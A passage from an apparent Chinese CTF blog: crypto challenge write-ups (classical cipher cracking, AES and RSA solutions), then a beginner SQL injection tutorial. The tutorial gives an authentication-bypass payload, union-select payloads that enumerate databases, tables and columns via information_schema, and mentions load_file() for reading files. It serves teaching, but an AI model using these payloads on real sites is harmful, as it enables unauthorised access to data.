class="number">0.04025</span></span><br><span class="line">best_freq[<span class="string">'m'</span>] = <span class="number">0.02406</span></span><br><span class="line">best_freq[<span class="string">'n'</span>] = <span class="number">0.06749</span></span><br><span class="line">best_freq[<span class="string">'o'</span>] = <span class="number">0.07507</span></span><br><span class="line">best_freq[<span class="string">'p'</span>] = <span class="number">0.01929</span></span><br><span class="line">best_freq[<span class="string">'q'</span>] = <span class="number">0.00095</span></span><br><span class="line">best_freq[<span class="string">'r'</span>] = <span class="number">0.05987</span></span><br><span class="line">best_freq[<span class="string">'s'</span>] = <span class="number">0.06327</span></span><br><span class="line">best_freq[<span class="string">'t'</span>] = <span class="number">0.09056</span></span><br><span class="line">best_freq[<span class="string">'u'</span>] = <span class="number">0.02758</span></span><br><span class="line">best_freq[<span class="string">'v'</span>] = <span class="number">0.00978</span></span><br><span class="line">best_freq[<span class="string">'w'</span>] = <span class="number">0.02360</span></span><br><span class="line">best_freq[<span class="string">'x'</span>] = <span class="number">0.00150</span></span><br><span class="line">best_freq[<span class="string">'y'</span>] = <span class="number">0.01974</span></span><br><span class="line">best_freq[<span class="string">'z'</span>] = <span class="number">0.00074</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> best_freq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_of_coincidence</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    计算字符串s的重合指数，即所有字符出现概率的平方和</span></span><br><span class="line"><span class="string">    :param s:密文字符串</span></span><br><span class="line"><span class="string">    :return:s的重合指数</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    zimubiao = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">    freq = {}</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> zimubiao:</span><br><span class="line">        freq[x] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">        freq[x] = freq[x] + <span class="number">1</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> zimubiao:</span><br><span class="line">        <span class="comment"># index = index + pow(float(freq[x]) / len(s), 2)</span></span><br><span class="line">       index = index + <span class="built_in">float</span>(freq[x] * (freq[x] - <span class="number">1</span>)) / (<span class="built_in">len</span>(s) * (<span class="built_in">len</span>(s) - <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> index</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_of_coincidence_2</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    计算明文s的拟重合指数，即s中字母的频率与英文字母的统计规律吻合程度</span></span><br><span class="line"><span class="string">    :param s:解出的明文</span></span><br><span class="line"><span class="string">    :return:s的拟重合指数</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    zimubiao = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">    freq = {}</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> zimubiao:</span><br><span class="line">       freq[x] = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> s:</span><br><span class="line">        freq[x] = freq[x] + <span class="number">1</span></span><br><span class="line">    index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> zimubiao:</span><br><span class="line">        index = index + <span class="built_in">float</span>(freq[x]) / <span class="built_in">len</span>(s) * best_freq[x]</span><br><span class="line">    <span class="keyword">return</span> index</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guessMN</span>():</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    根据题意，该加密应当会周期使用密钥，该周期是key_a长度和key_k长度的最小公倍数。</span></span><br><span class="line"><span class="string">    遍历周期1到100，分别测试不同周期下各个子密文段的重合指数，然后求平均</span></span><br><span class="line"><span class="string">    :return:无返回值，打印出所有与最佳重合指数相差小于0.01的周期</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        avergage_index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">            s = <span class="string">''</span>.join([c[j * l + i] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(c) / l)])</span><br><span class="line">            index = index_of_coincidence(s)</span><br><span class="line">            avergage_index += index</span><br><span class="line"></span><br><span class="line">        avergage_index = avergage_index / l - best_index_of_Coincidence</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(avergage_index) &lt; <span class="number">0.01</span>:</span><br><span class="line">            <span class="built_in">print</span> <span class="string">'l='</span>, l</span><br><span class="line">            <span class="built_in">print</span> avergage_index</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">'开始猜测周期'</span></span><br><span class="line"><span class="comment">#guessMN()#结果显示，重合指数得分较高的都是6的整数倍，所以周期极有可能是6</span></span><br><span class="line">l=<span class="number">55</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryptChar</span>(<span class="params">c, i, j</span>):</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    对单个密文字符解密。</span></span><br><span class="line"><span class="string">    :param c: 单个密文字符</span></span><br><span class="line"><span class="string">    :param i: 与字符c相乘的那个密钥</span></span><br><span class="line"><span class="string">    :param j: 用于位移的密钥</span></span><br><span class="line"><span class="string">    :return: 明文字符</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    i_inv = gm.invert(i, <span class="number">26</span>)</span><br><span class="line">    p = <span class="built_in">chr</span>((<span class="built_in">ord</span>(c) - <span class="built_in">ord</span>(<span class="string">'a'</span>) - j) * i_inv % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">'a'</span>))</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">s, i, j</span>):</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    用固定的i和j，解密子密文段</span></span><br><span class="line"><span class="string">   :param s: 使用相同i和j加密的子密文段</span></span><br><span class="line"><span class="string">    :param i: 与字符c相乘的那个密钥</span></span><br><span class="line"><span class="string">   :param j: 用于位移的密钥</span></span><br><span class="line"><span class="string">    :return: 明文字符串</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    p = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        p += decryptChar(c, i, j)</span><br><span class="line">    <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guessKey</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">   对子密文段爆破它所使用的i和j</span></span><br><span class="line"><span class="string">    :param c: 子密文段</span></span><br><span class="line"><span class="string">    :return: 无返回值，但是打印拟重合指数最佳的i和j，即解出的明文统计规律与英文字符统计规律最吻合的i和j</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">or</span> i == <span class="number">13</span>: <span class="comment">#若i与26不互素，则解除的明文不唯一，所以i一定不是2和13的倍数</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">            s = decrypt(c, i, j)</span><br><span class="line">            <span class="comment"># print s</span></span><br><span class="line">            index = index_of_coincidence_2(s)</span><br><span class="line">            index = <span class="built_in">abs</span>(index - <span class="number">0.065</span>)</span><br><span class="line">            <span class="keyword">if</span> index &lt; <span class="number">0.01</span>:</span><br><span class="line">                <span class="built_in">print</span> i, j, index</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guessAllKeys</span>():</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">   以l为周期，将完整密文c切分成l个子密文段，对这l个子密文段分别爆破其所使用密钥i和j</span></span><br><span class="line"><span class="string">    :return: 无返回值，但打印出最佳的密钥组合</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        s = <span class="string">''</span>.join([c[j * l + i] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(c) / l)])</span><br><span class="line">        <span class="built_in">print</span> i</span><br><span class="line">        guessKey(s)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">'开始猜测密钥组合'</span></span><br><span class="line"><span class="comment">#guessAllKeys()</span></span><br><span class="line"><span class="comment"># 根据打印结果，发现最佳组合依次是</span></span><br><span class="line"><span class="comment"># 19,10</span></span><br><span class="line"><span class="comment"># 7,9</span></span><br><span class="line"><span class="comment"># 23,3</span></span><br><span class="line"><span class="comment"># 19,24</span></span><br><span class="line"><span class="comment"># 7,14</span></span><br><span class="line"><span class="comment"># 23,15</span></span><br><span class="line"><span class="comment"># 将l设置成12、18、24或更多，还是可以得到这样的组合的重复</span></span><br><span class="line"><span class="comment"># 现在基本可以确定密钥应该是这样的</span></span><br><span class="line">key_a = [<span class="number">23</span>, <span class="number">25</span>, <span class="number">21</span>,<span class="number">3</span>,<span class="number">19</span>]</span><br><span class="line">key_k = [<span class="number">9</span>, <span class="number">21</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">16</span>,<span class="number">3</span>, <span class="number">22</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">21</span>,<span class="number">15</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用key_a, key_k解密完整的密文，得到明文</span></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    p += decryptChar(c[i], key_a[i % <span class="number">5</span>], key_k[i % <span class="number">11</span>])</span><br><span class="line"><span class="built_in">print</span> p</span><br><span class="line"><span class="comment">#在最后得到密码frequencyisoeasy</span></span><br></pre></td></tr></table></figure>
<p>Python3解AES：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">key = <span class="string">"frequencyisoeasy"</span></span><br><span class="line">aes = AES.new(key.encode(), AES.MODE_CBC, <span class="string">b'\0'</span> * <span class="number">16</span>)</span><br><span class="line">a = <span class="string">b'XpOY4zBvK6h//jAgIraYzBBK1lXz9pw7DxXGt6XoODZrSUCpjFzgw5pCo3ffclKM'</span></span><br><span class="line">a=base64.b64decode(a)</span><br><span class="line"><span class="built_in">print</span>((aes.decrypt(a)))</span><br></pre></td></tr></table></figure>
<h3 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h3><p><img src="https://c.img.dasctf.com/images/20221220/1671531589459-c167f20e-1faf-42c2-bc4e-b2aa66fa763b.png" alt="image-20210509202737039"></p>
<p>其余部分可以参考</p>
<p><a href="http://www.zbc53.top/archives/105/">srtiving写的题目杂记6</a></p>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p>题目改编自NUCA的Crypto赛题babycrypto</p>
<p><a href="https://cloud.tencent.com/developer/article/1472511">nuca_crypto_babycrypto_writeup</a></p>
<p><a href="http://www.zbc53.top/archives/105/">srtiving写的题目杂记6</a></p>
<p><a href="https://baike.baidu.com/item/%E9%87%8D%E5%90%88%E6%8C%87%E6%95%B0/1435574?fr=aladdin">重合指数——百度百科</a></p>
<h2 id="ctfshow大牛杯-小二的R54（前半部分）"><a href="#ctfshow大牛杯-小二的R54（前半部分）" class="headerlink" title="ctfshow大牛杯:小二的R54（前半部分）"></a>ctfshow大牛杯:小二的R54（前半部分）</h2><h3 id="题目"><a href="#题目" class="headerlink" title="题目:"></a>题目:</h3><p>整理下得到：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x, y = [random_prime(<span class="number">2</span> ^ <span class="number">1024</span> - <span class="number">1</span>, <span class="literal">False</span>, <span class="number">2</span> ^ <span class="number">1023</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">n = x * y, </span><br><span class="line">tmp = <span class="built_in">pow</span>(<span class="number">2021</span> * x + <span class="number">501</span> * y, x * y - x - y, x * y), </span><br><span class="line">c = <span class="built_in">pow</span>(flag, <span class="number">0o200001</span>, x * y)</span><br><span class="line"></span><br><span class="line">n=<span class="number">20947495659013288660808536751393787394664606045798093048128257278988208709333248671898749660848208653968668634891579612784633367362177864996602736258460476691940723323282467207875842974409286563660436709535601954405015261428106261369927836045794170912665351432105165546188591486357060490032334793140396757102052999128194027485573053073959574695808224922102635888141991154365047911830780778957642166757152369955362399379720841279167832886144458760347392316082994786119404006382441787685301119197529946566027319295285387108473752590621030421978808950305190250697199878929419723511578437404000924310974770501204226510397</span>, </span><br><span class="line">tmp = <span class="number">12911378830212711575909332427930495830030418987483519620282504671823307660633472092466534392403086505995560725428252134905285658936113891795434303336259751169171583600394870893708505805256284455729584616439559184469715186920464999723861722097244025658190194027561300165723184060071016117033960821040587421503448139025974851980482004179865110864844573575034406782936965166402665401330436229441569042660851847498727291447251591027480750458209012729510702196684303778564353025395186191064801000127420683298000173389589468742142444444759536629401472836827952997758216526858512433131954439154124668711408079361172485321041</span>, </span><br><span class="line">c = <span class="number">13390681135321846035598057088735733735860895610541899486616159864716324918810264721878447895634342127744578566110322466944217562868186608760962032192994397783118528288276520451944892998435079744244578731427626946331165523865930693902700790185275273534104979885060728696532991031786741950704918951536399577118136416956670893081637730646528913282395731901667720418372650030593319596584787752412110672058692368924987360383096340538971725402687347195347344826404005229912821371282465882351660619944919637382790572267512735645269618163597227604601321699186335016345484182059187046972681187078878556533926780789183784240737</span>]</span><br></pre></td></tr></table></figure>
<h3 id="exp：-1"><a href="#exp：-1" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n=<span class="number">20947495659013288660808536751393787394664606045798093048128257278988208709333248671898749660848208653968668634891579612784633367362177864996602736258460476691940723323282467207875842974409286563660436709535601954405015261428106261369927836045794170912665351432105165546188591486357060490032334793140396757102052999128194027485573053073959574695808224922102635888141991154365047911830780778957642166757152369955362399379720841279167832886144458760347392316082994786119404006382441787685301119197529946566027319295285387108473752590621030421978808950305190250697199878929419723511578437404000924310974770501204226510397</span></span><br><span class="line">tmp=<span class="number">12911378830212711575909332427930495830030418987483519620282504671823307660633472092466534392403086505995560725428252134905285658936113891795434303336259751169171583600394870893708505805256284455729584616439559184469715186920464999723861722097244025658190194027561300165723184060071016117033960821040587421503448139025974851980482004179865110864844573575034406782936965166402665401330436229441569042660851847498727291447251591027480750458209012729510702196684303778564353025395186191064801000127420683298000173389589468742142444444759536629401472836827952997758216526858512433131954439154124668711408079361172485321041</span></span><br><span class="line">c=<span class="number">13390681135321846035598057088735733735860895610541899486616159864716324918810264721878447895634342127744578566110322466944217562868186608760962032192994397783118528288276520451944892998435079744244578731427626946331165523865930693902700790185275273534104979885060728696532991031786741950704918951536399577118136416956670893081637730646528913282395731901667720418372650030593319596584787752412110672058692368924987360383096340538971725402687347195347344826404005229912821371282465882351660619944919637382790572267512735645269618163597227604601321699186335016345484182059187046972681187078878556533926780789183784240737</span></span><br><span class="line"></span><br><span class="line">x=Int(<span class="string">'x'</span>)</span><br><span class="line">y=Int(<span class="string">'y'</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add(inverse(tmp,n)==<span class="number">2021</span>*x+<span class="number">501</span>*y)</span><br><span class="line">s.add(x*y==n)</span><br><span class="line">s.add(x &gt; <span class="number">1</span>)</span><br><span class="line">s.add(y &gt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">assert</span> s.check()==sat</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'x='</span>,s.model()[x])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'y='</span>,s.model()[y])</span><br><span class="line"></span><br><span class="line">x=<span class="built_in">int</span>(<span class="built_in">str</span>(s.model()[x]))</span><br><span class="line">y=<span class="built_in">int</span>(<span class="built_in">str</span>(s.model()[y]))</span><br><span class="line">phi = (x-<span class="number">1</span>)*(y-<span class="number">1</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,inverse(e,phi),n)))</span><br></pre></td></tr></table></figure>
<h3 id="知识点：-1"><a href="#知识点：-1" class="headerlink" title="知识点："></a>知识点：</h3><script type="math/tex; mode=display">
a^{\varphi \left( n \right)}\,\,\equiv \,\,1\left( mod\,\,n \right) 
\\
a^{\varphi \left( n \right) -1}\,\,\equiv \,\,tmp\left( mod\,\,n \right) 
\\
a\,\,\cdot \,\,tmp\,\,\equiv \,\,1\left( mod\,\,n \right) 
\\
a\,\,=\,\,tmp^{-1}\,\,mod\,\,n</script><p>后半部分的维吉尼亚还没有解出来。</p>
<p>更新：循环维吉尼亚，密码shosho</p>
]]></content>
      <categories>
        <category>crypto</category>
      </categories>
      <tags>
        <tag>比赛复现</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL入门篇</title>
    <url>/2021/04/29/SQL%E5%85%A5%E9%97%A8%E7%AF%87/</url>
    <content><![CDATA[<h1 id="SQL注入入门"><a href="#SQL注入入门" class="headerlink" title="SQL注入入门"></a>SQL注入入门</h1><p>从零开始学习SQL注入。以下内容从nep冬令营SQL注入讲解视频以及对应课件中整理。</p>
<span id="more"></span>
<h2 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h2><h3 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h3><h3 id="mysql基础操作"><a href="#mysql基础操作" class="headerlink" title="mysql基础操作"></a>mysql基础操作</h3><p>登录数据库：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure>
<p>查看库名:</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; show databases</span><br></pre></td></tr></table></figure>
<p>创建库、删除库、使用库</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; create database mrkaixin</span><br></pre></td></tr></table></figure>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; drop database mrkaixin</span><br></pre></td></tr></table></figure>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; use mrkaixin</span><br></pre></td></tr></table></figure>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mysql&gt; create table user(</span><br><span class="line">-&gt; `id` int(<span class="number">11</span>)</span><br><span class="line">-&gt; `name` varchar(<span class="number">255</span>)</span><br><span class="line">-&gt; );</span><br></pre></td></tr></table></figure>
<h3 id="mysql表的一些基本操作-增删查改"><a href="#mysql表的一些基本操作-增删查改" class="headerlink" title="mysql表的一些基本操作(增删查改)"></a>mysql表的一些基本操作(增删查改)</h3><h4 id="Insert"><a href="#Insert" class="headerlink" title="Insert :"></a>Insert :</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> mrkaixin <span class="keyword">values</span>(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;nepnep&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h4 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> mrkaixin <span class="keyword">where</span> xxxx;</span><br></pre></td></tr></table></figure>
<h4 id="Update"><a href="#Update" class="headerlink" title="Update"></a>Update</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">update mrkaixin <span class="keyword">set</span> name <span class="operator">=</span> <span class="string">&#x27;x&#x27;</span> <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">3</span>;</span><br></pre></td></tr></table></figure>
<h4 id="Select"><a href="#Select" class="headerlink" title="Select"></a>Select</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mrkaixin;</span><br></pre></td></tr></table></figure>
<p>备注：<code>*</code>表示输出全部字段。</p>
<h3 id="mysql的常用的变量-函数"><a href="#mysql的常用的变量-函数" class="headerlink" title="mysql的常用的变量(函数)"></a>mysql的常用的变量(函数)</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> Database()    <span class="operator">/</span><span class="operator">/</span>查看当前的用户名</span><br><span class="line"><span class="number">2.</span> <span class="keyword">User</span>()        <span class="operator">/</span><span class="operator">/</span>用户</span><br><span class="line"><span class="number">3.</span> Version()     <span class="operator">/</span><span class="operator">/</span>mysql版本</span><br><span class="line"><span class="number">4.</span> @<span class="variable">@basedir</span>     <span class="operator">/</span><span class="operator">/</span>安装路径</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="mysql中的常用的符号"><a href="#mysql中的常用的符号" class="headerlink" title="mysql中的常用的符号"></a>mysql中的常用的符号</h3><h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. &amp;   and</span><br><span class="line">2. ||  or</span><br><span class="line">3. ^   xor</span><br></pre></td></tr></table></figure>
<p>mysql中常用的函数</p>
<h4 id="字符串截取函数"><a href="#字符串截取函数" class="headerlink" title="字符串截取函数"></a>字符串截取函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Substr(database(),1,1)</span><br><span class="line">Subtring</span><br><span class="line">Mid(database(),1,1)</span><br><span class="line">Left(database(),1)</span><br></pre></td></tr></table></figure>
<h4 id="编码函数"><a href="#编码函数" class="headerlink" title="编码函数"></a>编码函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ascii()</span><br><span class="line">Hex()</span><br><span class="line">Char()      &#x2F;&#x2F;ascii()的逆函数</span><br></pre></td></tr></table></figure>
<h4 id="文件函数"><a href="#文件函数" class="headerlink" title="文件函数"></a>文件函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Load_file()   &#x2F;&#x2F;读取文件内容</span><br></pre></td></tr></table></figure>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="SQL注入起手式"><a href="#SQL注入起手式" class="headerlink" title="SQL注入起手式"></a>SQL注入起手式</h3><h4 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h4><p>常见的注释符</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. #(%23)</span><br><span class="line">2. --+</span><br><span class="line">3. ;%00</span><br><span class="line">4. &#96;</span><br></pre></td></tr></table></figure>
<p>思考:</p>
<p>如果在CTF中，把常用的注释符，以及单引号都按了，那么又该怎么闭合呢？</p>
<p>这里我们通过使用在<code>&quot;\&quot;</code>来将<code>$username</code>后面的单引号转义。然后我们想办法在<code>$password</code>部分注释掉后面的单引号。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> data <span class="keyword">where</span> username <span class="operator">=</span> <span class="string">&#x27;\&#x27;</span><span class="keyword">and</span> password <span class="operator">=</span> <span class="string">&#x27; or 1=1 ;%00&#x27;</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>第二个单引号被\转义了。第一个和第三个单引号之间的值为username的值</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span><span class="keyword">or</span>后面是输入的password的值，;<span class="operator">%</span><span class="number">00</span>可以用来闭合后面的单引号。</span><br></pre></td></tr></table></figure>
<h3 id="SQL注入的常见姿势"><a href="#SQL注入的常见姿势" class="headerlink" title="SQL注入的常见姿势"></a>SQL注入的常见姿势</h3><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><h5 id="联合查询的基本要求："><a href="#联合查询的基本要求：" class="headerlink" title="联合查询的基本要求："></a>联合查询的基本要求：</h5><p>1、查询列数必须一致</p>
<p>2、查询语句的查询的各列类型、顺序最好一致</p>
<h5 id="联合查询的步骤"><a href="#联合查询的步骤" class="headerlink" title="联合查询的步骤"></a>联合查询的步骤</h5><p>1、闭合</p>
<p>2、判断字段数</p>
<h5 id="注意：order-by操作"><a href="#注意：order-by操作" class="headerlink" title="注意：order by操作"></a>注意：order by操作</h5><p>Order by : 如果后面接的是整形的话，根据第几个字段进行排序。</p>
<h5 id="简单介绍一下SQL-union操作符"><a href="#简单介绍一下SQL-union操作符" class="headerlink" title="简单介绍一下SQL union操作符"></a>简单介绍一下SQL union操作符</h5><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。</p>
<p>请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。</p>
<p> SQL UNION语法：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1</span><br><span class="line"><span class="keyword">UNION</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</span><br></pre></td></tr></table></figure>
<p>注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。</p>
<p> SQL UNION ALL 语法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name1</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name(s) <span class="keyword">FROM</span> table_name2</span><br></pre></td></tr></table></figure>
<p>另外，UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531635590-13ce7f0b-c056-4ee1-bd27-28328161a19b.png" alt="image-20210501122431780"></p>
<h5 id="判断结果输出位置"><a href="#判断结果输出位置" class="headerlink" title="判断结果输出位置"></a>判断结果输出位置</h5><p>这里我们可以看到，如果是1的话，如果数据库中是存在id = 1 ，那么就会返回两行数据，但是由于limit 0,1 。Mysql总会返回第一条数据。所以自然是返回原来查询的，所以这里我们id = -1 或者其他不存在的列，那么第一行就一定是我们自己控制的了。</p>
<p><img src="https://c.img.dasctf.com/images/20221220/1671531641479-36a496d8-7184-4373-b299-74b40a705aca.png" alt="image-20210504121547474"></p>
<h5 id="爆库、爆表、爆列"><a href="#爆库、爆表、爆列" class="headerlink" title="爆库、爆表、爆列"></a>爆库、爆表、爆列</h5><p>讲爆X之前，我们先来认识一下information_schema这一个数据库<br>这个库中我们先来看看这两个表</p>
<blockquote>
<p>TABLE表 :提供了关于数据库中的表的信息（包括视图）<br>COLUMNS表:提供了表中的列信息。</p>
</blockquote>
<p>爆破库名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database()</span><br></pre></td></tr></table></figure>
<p>爆表名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>, group_concat(table_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
<p>爆Column名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>, group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
<p>表名列名都有了之后，我们便可以通过，自由构造语句来获取获取每一个表中的信息了。</p>
<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在没法使用union联合查询时使用，前提是不能过滤一些关键函数。</p>
<p>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p>
